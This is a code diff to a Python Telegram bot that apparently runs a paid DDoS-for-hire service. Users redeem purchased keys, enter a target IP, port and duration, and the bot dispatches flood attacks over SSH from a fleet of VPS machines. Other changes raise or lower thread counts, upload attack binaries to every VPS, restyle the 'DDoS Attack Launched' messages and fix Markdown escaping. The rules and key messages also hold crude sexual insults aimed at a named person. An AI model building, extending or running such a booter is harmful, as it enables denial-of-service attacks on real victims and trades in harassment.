@@ -6,6 +6,7 @@ import asyncio
 import random
 import re
 import json
+import datetime # Import datetime for current date/time
 from telegram import Update, ReplyKeyboardMarkup
 from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackContext, ConversationHandler
 from telegram import InlineKeyboardButton, InlineKeyboardMarkup
@@ -49,10 +50,10 @@ SPECIAL_MAX_DURATION = 240
 SPECIAL_MAX_THREADS = 2000
 BOT_START_TIME = time.time()
 
-DEFAULT_THREADS = 18000
+DEFAULT_THREADS = 1000
 DEFAULT_PACKET = 64
 
-ACTIVE_VPS_COUNT = 20 # डिफॉल्ट रूप से 6 VPS इस्तेमाल होंगे
+ACTIVE_VPS_COUNT = 6  # डिफॉल्ट रूप से 6 VPS इस्तेमाल होंगे
 # Display Name Configuration
 GROUP_DISPLAY_NAMES = {}  # Key: group_id, Value: display_name
 DISPLAY_NAME_FILE = "display_names.json"
@@ -194,18 +195,28 @@ running_attacks = {}
 
 # Keyboards
 group_user_keyboard = [
-    ['/Start', 'Attack'],
+    ['/Start', '🚀 𝘼𝙏𝙏𝘼𝘾𝙆 𝙇𝘼𝙐𝙉𝘾𝙃'], # Changed button text
     ['Redeem Key', 'Rules'],
     ['🔍 Status', '⏳ Uptime']
 ]
 group_user_markup = ReplyKeyboardMarkup(group_user_keyboard, resize_keyboard=True)
 
 reseller_keyboard = [
-    ['/Start', 'Attack', 'Redeem Key'],
+    ['/Start', '🚀 𝘼𝙏𝙏𝘼𝘾𝙆 𝙇𝘼𝙐𝙉𝘾𝙃', 'Redeem Key'], # Changed button text
     ['Rules', 'Balance', 'Generate Key'],
     ['🔑 Special Key', 'Keys', '⏳ Uptime']
 ]
 reseller_markup = ReplyKeyboardMarkup(reseller_keyboard, resize_keyboard=True)
+
+# NEW: VIP Keyboard
+vip_keyboard = [
+    ['/Start', '🚀 𝘼𝙏𝙏𝘼𝘾𝙆 𝙇𝘼𝙐𝙉𝘾𝙃'],
+    ['Redeem Key', 'Rules'],
+    ['🔍 Status', '⏳ Uptime'],
+    ['🔑 Special Key'] # VIP users can generate special keys if they are resellers or have special access
+]
+vip_markup = ReplyKeyboardMarkup(vip_keyboard, resize_keyboard=True)
+
 
 # Settings menu keyboard with Reset VPS button
 settings_keyboard = [
@@ -227,7 +238,7 @@ owner_settings_keyboard = [
 owner_settings_markup = ReplyKeyboardMarkup(owner_settings_keyboard, resize_keyboard=True)
 
 owner_keyboard = [
-    ['/Start', 'Attack', 'Redeem Key'],
+    ['/Start', '🚀 𝘼𝙏𝙏𝘼𝘾𝙆 𝙇𝘼𝙐𝙉𝘾𝙃', 'Redeem Key'], # Changed button text
     ['Rules', 'Settings', 'Generate Key'],
     ['Delete Key', '🔑 Special Key', '⏳ Uptime'],
     ['OpenBot', 'CloseBot', 'Menu'],
@@ -236,7 +247,7 @@ owner_keyboard = [
 owner_markup = ReplyKeyboardMarkup(owner_keyboard, resize_keyboard=True)
 
 co_owner_keyboard = [
-    ['Sstart', 'Attack', 'Redeem Key'],
+    ['Sstart', '🚀 𝘼𝙏𝙏𝘼𝘾𝙆 𝙇𝘼𝙐𝙉𝘾𝙃', 'Redeem Key'], # Changed button text
     ['Rules', 'Delete Key', 'Generate Key'],
     ['OpenBot', '🔑 Special Key', 'CloseBot'],
     ['Settings', '⏳ Uptime', 'Menu']
@@ -1052,12 +1063,12 @@ async def show_running_attacks(update: Update, context: CallbackContext):
         remaining = max(0, attack_info['duration'] - elapsed)
         
         message += (
-            f"🎯 Target: `{target}`\n"
+            f"🎯 Target: `{escape_markdown(target, version=2)}`\n" # Escape target
             f"⏱️ Elapsed: `{elapsed}s` | Remaining: `{remaining}s`\n"
             f"🧵 Threads: `{SPECIAL_MAX_THREADS if attack_info['is_special'] else MAX_THREADS}`\n\n"
         )
     
-    await update.message.reply_text(message, parse_mode='Markdown')
+    await update.message.reply_text(message, parse_mode='MarkdownV2') # Use MarkdownV2
 
 async def remove_bot_instance(update: Update, context: CallbackContext):
     """Remove a bot instance"""
@@ -1253,13 +1264,13 @@ async def show_bot_list_cmd(update: Update, context: CallbackContext):
         message += (
             f"{i}. Owner: @{config['owner_username']}\n"
             f"   Status: {status}\n"
-            f"   Token: `{config['token'][:10]}...`\n"
-            f"   Data Dir: `{config.get('data_dir', 'N/A')}`\n\n"
+            f"   Token: `{escape_markdown(config['token'][:10] + '...', version=2)}`\n" # Escape token
+            f"   Data Dir: `{escape_markdown(config.get('data_dir', 'N/A'), version=2)}`\n\n" # Escape data_dir
         )
     
     await update.message.reply_text(
         message,
-        parse_mode='Markdown'
+        parse_mode='MarkdownV2' # Use MarkdownV2
     )
 
 async def open_bot(update: Update, context: CallbackContext):
@@ -1287,73 +1298,107 @@ async def close_bot(update: Update, context: CallbackContext):
         parse_mode='Markdown'
     )
 
-async def start(update: Update, context: CallbackContext):
-    chat = update.effective_chat
-    user = update.effective_user
-    image = get_random_start_image()
+def handle_referral(update: Update, referral_code: str):
+    """Placeholder for referral handling logic."""
+    logging.info(f"User {update.effective_user.id} started with referral code: {referral_code}")
+    # You can add logic here to:
+    # - Validate the referral code
+    # - Grant rewards to the referrer
+    # - Grant initial benefits to the referred user
+    # - Store referral data in your database/file
+    pass
 
-     # Track this interaction
+async def start(update: Update, context: CallbackContext):
+    """Handle /start command with premium styling"""
+    user = update.effective_user
+    chat = update.effective_chat
+    user_id = str(user.id)
+
+    # Check for referral code
+    if len(context.args) > 0:
+        referral_code = context.args[0]
+        handle_referral(update, referral_code)
+    
+    now = datetime.datetime.now()
+    current_time = now.strftime('%H:%M:%S')
+    current_date = now.strftime('%Y-%m-%d')
+
+    # Default owner name, can be overridden by group settings if implemented
+    owner_name = get_display_name(chat.id if chat.type in ['group', 'supergroup'] else None)
+
+    username_display = f"@{escape_markdown(user.username, version=2)}" if user.username else escape_markdown(user.first_name, version=2)
+    user_info = f"├ 𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲: {username_display}\n└ 𝗨𝘀𝗲𝗿 𝗜𝗗: `{user.id}`"
+
+    caption = ""
+    markup = None
+
+    if is_owner(update):
+        caption = f"""
+╭━━━〔 *𝗔𝗗𝗠𝗜𝗡 𝗖𝗘𝗡𝗧𝗘𝗥* 〕━━━╮
+*"Master of The Networks" — Access Granted*
+╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯
+
+🛡️ *𝗦𝗧𝗔𝗧𝗨𝗦:* `ADMIN PRIVILEGES GRANTED`  
+🎉 Welcome back, Commander *{escape_markdown(user.first_name, version=2)}*
+
+*─────⟪ 𝗦𝗬𝗦𝗧𝗘𝗠 𝗜𝗗𝗘𝗡𝗧𝗜𝗧𝗬 ⟫─────* {user_info}
+
+📅 `{current_date}` | 🕒 `{current_time}`  
+🔰 *𝗚𝗿𝗼𝘂𝗽 𝗢𝘄𝗻𝗲𝗿:* {owner_name}
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+▶️ *Dashboard Ready — Execute Commands Below*
+"""
+        markup = owner_markup # Use the existing owner_markup
+    elif user_id in redeemed_users and isinstance(redeemed_users[user_id], dict) and redeemed_users[user_id].get('is_special'): # Check for special key (VIP)
+        caption = f"""
+╭━━━〔 *𝗩𝗜𝗣 𝗔𝗖𝗖𝗘𝗦𝗦* 〕━━━╮
+*"Elite Access Granted" — Welcome Onboard*
+╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯
+
+🌟 *𝗦𝗧𝗔𝗧𝗨𝗦:* `VIP MEMBER`  
+👋 Hello, *{escape_markdown(user.first_name, version=2)}*
+
+*─────⟪ 𝗨𝗦𝗘𝗥 𝗗𝗘𝗧𝗔𝗜𝗟𝗦 ⟫─────* {user_info}
+
+📅 `{current_date}` | 🕒 `{current_time}`  
+🔰 *𝗚𝗿𝗼𝘂𝗽 𝗢𝘄𝗻𝗲𝗿:* {owner_name}
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+▶️ *VIP Panel Ready — Explore Your Powers*
+"""
+        markup = vip_markup # Use the new VIP markup
+    else:
+        caption = f"""
+╭━━━〔 *𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗣𝗔𝗡𝗘𝗟* 〕━━━╮
+*"Network Access Initiated"*
+╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯
+
+🚀 *𝗦𝗧𝗔𝗧𝗨𝗦:* `GENERAL ACCESS`  
+👋 Hello, *{escape_markdown(user.first_name, version=2)}*
+
+*─────⟪ 𝗨𝗦𝗘𝗥 𝗗𝗘𝗧𝗔𝗜𝗟𝗦 ⟫─────* {user_info}
+
+📅 `{current_date}` | 🕒 `{current_time}`  
+🔰 *𝗚𝗿𝗼𝘂𝗽 𝗢𝘄𝗻𝗲𝗿:* {owner_name}
+━━━━━━━━━━━━━━━ ━━━━━━━━━━━━━━━━
+▶️ Buy special key to unlock VIP features Dm @RAJARAJ909 \!
+"""
+        markup = group_user_markup # Use the existing group user markup
+
+    # Track this interaction
     if 'users_interacted' not in context.bot_data:
         context.bot_data['users_interacted'] = set()
     context.bot_data['users_interacted'].add(user.id)
-    
-    current_display_name = get_display_name(chat.id if chat.type in ['group', 'supergroup'] else None)
-    
-    modified_caption = (
-        f"{image['caption']}\n\n"
-    )
-    
-    if chat.type == "private":
-        if not is_authorized_user(update):
-            # Changed reply_photo to send_photo for robustness
-            await context.bot.send_photo(
-                chat_id=chat.id,
-                photo=image['url'],
-                caption=f"❌ *This bot is not authorized to use here.*\n\n",
-                parse_mode='Markdown'
-            )
-            return
 
-        if is_owner(update):
-            # Changed reply_photo to send_photo for robustness
-            await context.bot.send_photo(
-                chat_id=chat.id,
-                photo=image['url'],
-                caption=modified_caption,
-                parse_mode='Markdown',
-                reply_markup=owner_markup
-            )
-        elif is_co_owner(update):
-            # Changed reply_photo to send_photo for robustness
-            await context.bot.send_photo(
-                chat_id=chat.id,
-                photo=image['url'],
-                caption=modified_caption,
-                parse_mode='Markdown',
-                reply_markup=co_owner_markup
-            )
-        else:
-            # Changed reply_photo to send_photo for robustness
-            await context.bot.send_photo(
-                chat_id=chat.id,
-                photo=image['url'],
-                caption=modified_caption,
-                parse_mode='Markdown',
-                reply_markup=reseller_markup
-            )
-        return
-
-    if not is_allowed_group(update):
-        return
-
-    # Changed reply_photo to send_photo for robustness
+    # Send photo with caption and markup
+    image = get_random_start_image() # Assuming you want to keep the random image
     await context.bot.send_photo(
         chat_id=chat.id,
         photo=image['url'],
-        caption=modified_caption,
-        parse_mode='Markdown',
-        reply_markup=group_user_markup
+        caption=caption,
+        parse_mode='MarkdownV2',
+        reply_markup=markup
     )
+
 
 async def generate_key_start(update: Update, context: CallbackContext):
     if not (is_owner(update) or is_co_owner(update) or is_reseller(update)):
@@ -1392,9 +1437,9 @@ async def generate_key_duration(update: Update, context: CallbackContext):
     current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
     
     await update.message.reply_text(
-        f"🔑 *Generated Key:* `{key}`\n\n"
+        f"🔑 *Generated Key:* `{escape_markdown(key, version=2)}`\n\n" # Escape key
         f"*This key is valid for {duration_str}.*\n\n",
-        parse_mode='Markdown'
+        parse_mode='MarkdownV2' # Use MarkdownV2
     )
     return ConversationHandler.END
 
@@ -1460,13 +1505,13 @@ async def generate_special_key_format(update: Update, context: CallbackContext):
     
     await update.message.reply_text(
         f"💎 *Special Key Generated!*\n\n"
-        f"🔑 *Key:* `{key}`\n"
+        f"🔑 *Key:* `{escape_markdown(key, version=2)}`\n" # Escape key
         f"⏳ *Duration:* {days} days\n"
         f"⚡ *Max Duration:* {SPECIAL_MAX_DURATION} sec\n"
         f"🧵 *Max Threads:* {SPECIAL_MAX_THREADS}\n\n"
         f"👑 *Bot Owner:* PAPA KA BOT\n\n"
         f"⚠️ *This key provides enhanced attack capabilities when you fucking Ritik mommy!*",
-        parse_mode='Markdown'
+        parse_mode='MarkdownV2' # Use MarkdownV2
     )
     return ConversationHandler.END
 
@@ -1499,9 +1544,9 @@ async def redeem_key_input(update: Update, context: CallbackContext):
         current_display_name = get_display_name(update.effective_chat.id)
         
         await update.message.reply_text(
-            f"✅ *Key redeemed successfully! You can now use the attack command for {key.split('-')[1]}.*\n\n"
+            f"✅ *Key redeemed successfully! You can now use the attack command for {escape_markdown(key.split('-')[1], version=2)}.*\n\n" # Escape key part
             f"👑 *Bot Owner:* {current_display_name}",
-            parse_mode='Markdown'
+            parse_mode='MarkdownV2' # Use MarkdownV2
         )
     elif key in special_keys and special_keys[key]['expiration_time'] > time.time():
         user_id = update.effective_user.id
@@ -1592,7 +1637,7 @@ async def attack_start(update: Update, context: CallbackContext):
         current_display_name = get_display_name(update.effective_chat.id)
         
         await update.message.reply_text(
-            "❌ *You need a valid key to start an attack!*\n\n"
+            f"❌ *You need a valid key to start an attack!*\n\n"
             f"🔑 *Buy keys from {current_display_name}*",
             parse_mode='Markdown'
         )
@@ -1678,14 +1723,21 @@ async def attack_input(update: Update, context: CallbackContext):
 
     # Send attack started message immediately
     await update.message.reply_text(
-        f"⚔️ *Attack Started!*\n"
-        f"🎯 *Target*: {ip}:{port}\n"
-        f"🕒 *Duration*: {duration} sec\n"
-        f"🧵 *Total Power*: {DEFAULT_THREADS} threads\n"
-        f"🌐 *Attacking from*: {total_vps_to_use} VPS\n" # Added VPS count
-        f"👑 *Bot Owner:* {current_display_name}\n\n"
-        f"🔥 *ATTACK STARTED! Use /running to check status.* 💥",
-        parse_mode='Markdown'
+        f"""
+╭━━━〔 🚀 *𝗔𝗧𝗧𝗔𝗖𝗞 𝗟𝗔𝗨𝗡𝗖𝗛𝗘𝗗* 〕━━━╮
+⚡ *𝗗𝗗𝗼𝗦 𝗔𝘁𝘁𝗮𝗰𝗸 𝗜𝗻𝗶𝘁𝗶𝗮𝘁𝗲𝗱* ⚡
+╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯
+
+🎯 *𝗧𝗮𝗿𝗴𝗲𝘁:* `{escape_markdown(ip, version=2)}`:`{escape_markdown(port, version=2)}`
+🕒 *𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻:* {duration} sec
+🧵 *𝗧𝗼𝘁𝗮𝗹 𝗣𝗼𝘄𝗲𝗿:* {DEFAULT_THREADS} threads
+🌐 *𝗔𝘁𝘁𝗮𝗰𝗸𝗶𝗻𝗴 𝗳𝗿𝗼𝗺:* {total_vps_to_use} Proxy connect 
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+*Use /running to check live status\. Please wait for completion message\.*
+"""
+        ,
+        parse_mode='MarkdownV2' # Use MarkdownV2
     )
 
     # Counter to track completed VPS attacks for this request
@@ -1717,13 +1769,16 @@ async def attack_input(update: Update, context: CallbackContext):
                 
                 # Wait for the process on the VPS to complete, with a timeout
                 try:
-                    await asyncio.wait_for(process.wait(), timeout=duration + 30) # Add buffer for command execution
-                    stdout = (await process.stdout.read()).decode().strip()
-                    stderr = (await process.stderr.read()).decode().strip()
+                    # Removed .decode() as asyncssh.read() returns str
+                    stdout = (await process.stdout.read()).strip()
+                    stderr = (await process.stderr.read()).strip()
                     if stdout:
                         logging.info(f"VPS {ip_vps} stdout: {stdout}")
                     if stderr:
                         logging.error(f"VPS {ip_vps} stderr: {stderr}")
+                    
+                    await asyncio.wait_for(process.wait(), timeout=duration + 30) # Add buffer for command execution
+
                 except asyncio.TimeoutError:
                     logging.warning(f"Command timed out on VPS {ip_vps} for attack {full_attack_id}. Terminating remote process.")
                     try:
@@ -1732,24 +1787,25 @@ async def attack_input(update: Update, context: CallbackContext):
                         logging.error(f"Error terminating remote process on {ip_vps}: {term_e}")
                     await context.bot.send_message(
                         chat_id=chat_id,
-                        text=f"⚠️ *Attack on {ip}:{port} from {ip_vps} timed out after {duration}s.*",
-                        parse_mode='Markdown'
+                        text=f"⚠️ *Attack on `{escape_markdown(ip, version=2)}`:`{escape_markdown(port, version=2)}` from `{escape_markdown(ip_vps, version=2)}` timed out after {duration}s.*",
+                        parse_mode='MarkdownV2'
                     )
                 
                 logging.info(f"Attack command finished on VPS {ip_vps} for attack {full_attack_id}")
 
         except Exception as e:
             logging.error(f"SSH connection or command execution error on {ip_vps} for attack {full_attack_id}: {str(e)}")
+            error_message_escaped = escape_markdown(str(e), version=2) # Escape error message
             if "connection" in str(e).lower() or "auth" in str(e).lower():
                 await context.bot.send_message(
                     chat_id=OWNER_ID,
-                    text=f"🚨 *SSH Connection/Auth Failed for VPS {ip_vps} (Attack {ip}:{port})*\nError: `{escape_markdown(str(e), version=2)}`",
+                    text=f"🚨 *SSH Connection/Auth Failed for VPS `{escape_markdown(ip_vps, version=2)}` (Attack `{escape_markdown(ip, version=2)}`:`{escape_markdown(port, version=2)})*\nError: `{error_message_escaped}`",
                     parse_mode='MarkdownV2'
                 )
             else:
                 await context.bot.send_message(
                     chat_id=chat_id,
-                    text=f"❌ *Attack from {ip_vps} failed for {ip}:{port}*\nError: `{escape_markdown(str(e), version=2)}`",
+                    text=f"❌ *Attack from `{escape_markdown(ip_vps, version=2)}` failed for `{escape_markdown(ip, version=2)}`:`{escape_markdown(port, version=2)}`*\nError: `{error_message_escaped}`",
                     parse_mode='MarkdownV2'
                 )
         finally:
@@ -1762,12 +1818,19 @@ async def attack_input(update: Update, context: CallbackContext):
             if context.user_data[f'attack_completion_count_{attack_base_id}'] == context.user_data[f'total_vps_for_attack_{attack_base_id}']:
                 await context.bot.send_message(
                     chat_id=chat_id,
-                    text=f"✅ *Attack Finished!*\n"
-                         f"🎯 *Target*: {ip}:{port}\n"
-                         f"🕒 *Duration*: {duration} sec\n"
-                         f"👑 *Bot Owner:* {get_display_name(chat_id if chat_id in ALLOWED_GROUP_IDS else None)}\n\n"
-                         f"🔥 *ATTACK COMPLETED!*",
-                    parse_mode='Markdown'
+                    text=f"""
+╭━━━〔 ✅ *𝗔𝗧𝗧𝗔𝗖𝗞 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘* 〕━━━╮
+⚡ *𝗗𝗗𝗼𝗦 𝗔𝘁𝘁𝗮𝗰𝗸 𝗙𝗶𝗻𝗶𝘀𝗵𝗲𝗱* ⚡
+╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯
+
+🎯 *𝗧𝗮𝗿𝗴𝗲𝘁:* `{escape_markdown(ip, version=2)}`:`{escape_markdown(port, version=2)}`
+🕒 *𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻:* {duration} sec
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+*Attack on target completed successfully\.*
+"""
+                    ,
+                    parse_mode='MarkdownV2' # Use MarkdownV2
                 )
                 # Clean up user_data for this attack
                 del context.user_data[f'attack_completion_count_{attack_base_id}']
@@ -1893,7 +1956,7 @@ async def show_keys(update: Update, context: CallbackContext):
         f"\n\n👑 *Bot Owner:* PAPA KA BOT"
     )
 
-    await update.message.reply_text(message, parse_mode='Markdown')
+    await update.message.reply_text(message, parse_mode='MarkdownV2') # Use MarkdownV2
 
 async def set_duration_start(update: Update, context: CallbackContext):
     if not (is_owner(update) or is_co_owner(update)):
@@ -1981,10 +2044,10 @@ async def delete_key_input(update: Update, context: CallbackContext):
 
     if key in keys:
         del keys[key]
-        await update.message.reply_text(f"✅ *Key `{key}` deleted successfully!*", parse_mode='Markdown')
+        await update.message.reply_text(f"✅ *Key `{escape_markdown(key, version=2)}` deleted successfully!*", parse_mode='MarkdownV2')
     elif key in special_keys:
         del special_keys[key]
-        await update.message.reply_text(f"✅ *Special Key `{key}` deleted successfully!*", parse_mode='Markdown')
+        await update.message.reply_text(f"✅ *Special Key `{escape_markdown(key, version=2)}` deleted successfully!*", parse_mode='MarkdownV2')
     elif key in redeemed_keys_info:
         user_id = redeemed_keys_info[key]['redeemed_by']
         if isinstance(redeemed_users.get(user_id), dict):
@@ -1992,7 +2055,7 @@ async def delete_key_input(update: Update, context: CallbackContext):
         else:
             del redeemed_users[user_id]
         del redeemed_keys_info[key]
-        await update.message.reply_text(f"✅ *Redeemed key `{key}` deleted successfully!*", parse_mode='Markdown')
+        await update.message.reply_text(f"✅ *Redeemed key `{escape_markdown(key, version=2)}` deleted successfully!*", parse_mode='MarkdownV2')
     else:
         await update.message.reply_text("❌ *Key not found!*", parse_mode='Markdown')
 
@@ -2154,12 +2217,12 @@ async def check_key_status(update: Update, context: CallbackContext):
                 f"🔍 *Special Key Status*\n\n"
                 f"👤 *User:* {escape_markdown(user_name, version=2)}\n"
                 f"🆔 *ID:* `{user_id}`\n"
-                f"🔑 *Key:* `{escape_markdown(key_info, version=2) if key_info else 'Unknown'}`\n"
+                f"🔑 *Key:* `{escape_markdown(key_info, version=2) if key_info else 'Unknown'}`\n" # Escape key
                 f"⏳ *Status:* {status}\n"
                 f"⚡ *Max Duration:* {SPECIAL_MAX_DURATION} sec\n"
                 f"🧵 *Max Threads:* {SPECIAL_MAX_THREADS}\n\n"
                 f"👑 *Bot Owner:* {current_display_name}",
-                parse_mode='Markdown'
+                parse_mode='MarkdownV2' # Use MarkdownV2
             )
         elif isinstance(redeemed_users[user_id], (int, float)):
             if redeemed_users[user_id] <= current_time:
@@ -2180,10 +2243,10 @@ async def check_key_status(update: Update, context: CallbackContext):
                 f"🔍 *Key Status*\n\n"
                 f"👤 *User:* {escape_markdown(user_name, version=2)}\n"
                 f"🆔 *ID:* `{user_id}`\n"
-                f"🔑 *Key:* `{escape_markdown(key_info, version=2) if key_info else 'Unknown'}`\n"
+                f"🔑 *Key:* `{escape_markdown(key_info, version=2) if key_info else 'Unknown'}`\n" # Escape key
                 f"⏳ *Status:* {status}\n\n"
                 f"👑 *Bot Owner:* {current_display_name}",
-                parse_mode='Markdown'
+                parse_mode='MarkdownV2' # Use MarkdownV2
             )
     else:
         await update.message.reply_text(
@@ -2193,7 +2256,7 @@ async def check_key_status(update: Update, context: CallbackContext):
             f"❌ *No active key found!*\n"
             f"ℹ️ *Use the Redeem Key button to activate your access.*\n\n"
             f"👑 *Bot Owner:* {current_display_name}",
-            parse_mode='Markdown'
+            parse_mode='MarkdownV2' # Use MarkdownV2
         )
 
 async def add_vps_start(update: Update, context: CallbackContext):
@@ -2219,11 +2282,11 @@ async def add_vps_info(update: Update, context: CallbackContext):
         
         await update.message.reply_text(
             f"✅ VPS added successfully!\n\n"
-            f"IP: `{ip}`\n"
-            f"Username: `{username}`\n"
-            f"Password: `{password}`\n\n"
+            f"IP: `{escape_markdown(ip, version=2)}`\n" # Escape IP
+            f"Username: `{escape_markdown(username, version=2)}`\n" # Escape username
+            f"Password: `{escape_markdown(password, version=2)}`\n\n" # Escape password
             f"👑 *Bot Owner:* {current_display_name}",
-            parse_mode='Markdown'
+            parse_mode='MarkdownV2' # Use MarkdownV2
         )
     except ValueError:
         await update.message.reply_text(
@@ -2244,14 +2307,14 @@ async def remove_vps_start(update: Update, context: CallbackContext):
         return ConversationHandler.END
     
     vps_list_text = "\n".join(
-        f"{i+1}. IP: `{vps[0]}`, User: `{vps[1]}`" 
+        f"{i+1}. IP: `{escape_markdown(vps[0], version=2)}`, User: `{escape_markdown(vps[1], version=2)}`" # Escape IP and User
         for i, vps in enumerate(VPS_LIST))
     
     current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
     
     await update.message.reply_text(
         f"⚠️ Select VPS to remove by number:\n\n{vps_list_text}\n\n",
-        parse_mode='Markdown'
+        parse_mode='MarkdownV2' # Use MarkdownV2
     )
     return GET_VPS_TO_REMOVE
 
@@ -2265,9 +2328,9 @@ async def remove_vps_selection(update: Update, context: CallbackContext):
             
             await update.message.reply_text(
                 f"✅ VPS removed successfully!\n\n"
-                f"IP: `{removed_vps[0]}`\n"
-                f"Username: `{removed_vps[1]}`\n\n",
-                parse_mode='Markdown'
+                f"IP: `{escape_markdown(removed_vps[0], version=2)}`\n" # Escape IP
+                f"Username: `{escape_markdown(removed_vps[1], version=2)}`\n\n", # Escape username
+                parse_mode='MarkdownV2' # Use MarkdownV2
             )
         else:
             await update.message.reply_text("❌ Invalid selection!", parse_mode='Markdown')
@@ -2310,8 +2373,8 @@ async def upload_binary_confirm(update: Update, context: CallbackContext):
     current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
     
     message = await update.message.reply_text(
-        f"⏳ Starting {file_name} binary upload to all VPS...\n\n",
-        parse_mode='Markdown'
+        f"⏳ Starting {escape_markdown(file_name, version=2)} binary upload to all VPS...\n\n", # Escape file_name
+        parse_mode='MarkdownV2' # Use MarkdownV2
     )
     
     success_count = 0
@@ -2343,17 +2406,17 @@ async def upload_binary_confirm(update: Update, context: CallbackContext):
                 if file_name not in stdout.read().decode():
                     raise Exception("Upload verification failed")
                 
-                results.append(f"✅ {i+1}. {ip} - Success (Uploaded to {target_path})")
+                results.append(f"✅ {i+1}. `{escape_markdown(ip, version=2)}` - Success (Uploaded to `{escape_markdown(target_path, version=2)}`)") # Escape IP and target_path
                 success_count += 1
                 
             except Exception as e:
-                results.append(f"❌ {i+1}. {ip} - Failed: {str(e)}")
+                results.append(f"❌ {i+1}. `{escape_markdown(ip, version=2)}` - Failed: `{escape_markdown(str(e), version=2)}`") # Escape IP and error
                 fail_count += 1
             
             ssh.close()
             
         except Exception as e:
-            results.append(f"❌ {i+1}. {ip} - Connection Failed: {str(e)}")
+            results.append(f"❌ {i+1}. `{escape_markdown(ip, version=2)}` - Connection Failed: `{escape_markdown(str(e), version=2)}`") # Escape IP and error
             fail_count += 1
     
     # Remove the downloaded file
@@ -2364,11 +2427,11 @@ async def upload_binary_confirm(update: Update, context: CallbackContext):
     current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
     
     await message.edit_text(
-        f"📤 {file_name} Binary Upload Results:\n\n"
+        f"📤 `{escape_markdown(file_name, version=2)}` Binary Upload Results:\n\n" # Escape file_name
         f"✅ Success: {success_count}\n"
         f"❌ Failed: {fail_count}\n\n"
         f"{result_text}\n\n",
-        parse_mode='Markdown'
+        parse_mode='MarkdownV2' # Use MarkdownV2
     )
     
     return ConversationHandler.END
@@ -2431,15 +2494,15 @@ async def show_vps_status(update: Update, context: CallbackContext):
                 if "Error executing" in version_output:
                     binary_status = "✅ Binary working"
                 else:
-                    binary_status = f"✅ Working (Version: {version_output.split()[0] if version_output else 'Unknown'})"
+                    binary_status = f"✅ Working (Version: {escape_markdown(version_output.split()[0] if version_output else 'Unknown', version=2)})" # Escape version
             
             ssh.close()
             
             status_msg = (
                 f"🔹 *VPS {i+1} Status*\n"
                 f"{status}\n"
-                f"IP: `{ip}`\n"
-                f"User: `{username}`\n"
+                f"IP: `{escape_markdown(ip, version=2)}`\n" # Escape IP
+                f"User: `{escape_markdown(username, version=2)}`\n" # Escape username
                 f"Binary: {binary_status}\n"
             )
             status_messages.append(status_msg)
@@ -2448,9 +2511,9 @@ async def show_vps_status(update: Update, context: CallbackContext):
             status_msg = (
                 f"🔹 *VPS {i+1} Status*\n"
                 f"🔴 *Offline/Error*\n"
-                f"IP: `{ip}`\n"
-                f"User: `{username}`\n"
-                f"Error: `{str(e)}`\n"
+                f"IP: `{escape_markdown(ip, version=2)}`\n" # Escape IP
+                f"User: `{escape_markdown(username, version=2)}`\n" # Escape username
+                f"Error: `{escape_markdown(str(e), version=2)}`\n" # Escape error
             )
             status_messages.append(status_msg)
             offline_vps += 1
@@ -2470,32 +2533,32 @@ async def show_vps_status(update: Update, context: CallbackContext):
     
     # Edit the original message with the results
     try:
-        await message.edit_text(full_message, parse_mode='Markdown')
+        await message.edit_text(full_message, parse_mode='MarkdownV2') # Use MarkdownV2
     except Exception as e:
         logging.error(f"Error editing message: {e}")
         # If message is too long, send as new messages
         if len(full_message) > 4000:
             parts = [full_message[i:i+4000] for i in range(0, len(full_message), 4000)]
             for part in parts:
-                await update.message.reply_text(part, parse_mode='Markdown')
+                await update.message.reply_text(part, parse_mode='MarkdownV2') # Use MarkdownV2
         else:
-            await update.message.reply_text(full_message, parse_mode='Markdown')
+            await update.message.reply_text(full_message, parse_mode='MarkdownV2') # Use MarkdownV2
 
 async def rules(update: Update, context: CallbackContext):
     current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
     
     rules_text = (
         "📜 *Rules:*\n\n"
-        "1. Do not spam the bot.\n\n"
-        "2. Only use the bot in the allowed group.\n\n"
-        "3. Do not share your keys with others.\n\n"
-        "4. Follow the instructions carefully.\n\n"
-        "5. Respect other users and the bot owner.\n\n"
-        "6. Any violation of these rules will result key ban with no refund.\n\n\n"
-        "BSDK RULES FOLLOW KRNA WARNA GND MAR DUNGA.\n\n"
-        "JO BHI RITIK KI MAKI CHUT PHAADKE SS DEGA USSE EXTRA KEY DUNGA.\n\n"
+        "1\\. Do not spam the bot\\.\n\n" # Escaped periods
+        "2\\. Only use the bot in the allowed group\\.\n\n" # Escaped periods
+        "3\\. Do not share your keys with others\\.\n\n" # Escaped periods
+        "4\\. Follow the instructions carefully\\.\n\n" # Escaped periods
+        "5\\. Respect other users and the bot owner\\.\n\n" # Escaped periods
+        "6\\. Any violation of these rules will result key ban with no refund\\.\n\n\n" # Escaped periods
+        "BSDK RULES FOLLOW KRNA WARNA GND MAR DUNGA\\.\n\n" # Escaped periods
+        "JO BHI RITIK KI MAKI CHUT PHAADKE SS DEGA USSE EXTRA KEY DUNGA\\.\n\n" # Escaped periods
     )
-    await update.message.reply_text(rules_text, parse_mode='Markdown')
+    await update.message.reply_text(rules_text, parse_mode='MarkdownV2') # Use MarkdownV2
 
 async def add_group_id_start(update: Update, context: CallbackContext):
     if not (is_owner(update) or is_co_owner(update)):
